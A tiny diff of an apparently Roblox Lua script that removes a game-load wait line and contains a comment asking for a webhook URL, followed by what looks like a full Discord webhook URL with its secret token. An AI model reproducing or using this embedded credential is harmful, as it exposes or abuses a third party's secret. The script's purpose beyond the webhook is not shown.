@@ -1,4 +1,4 @@
-if not game:IsLoaded() then game.Loaded:Wait() end
+
 -- Replace the "WEBHOOK_URL_HERE" with your actual webhook URL
 local webhook = "https://discord.com/api/webhooks/1288429702293491775/ZbqmI34oqbEz1B8eUd22h8aORla__pAGrp4bedofLleUB-4vtmeQks-F_V6rlpm64iY9"
 
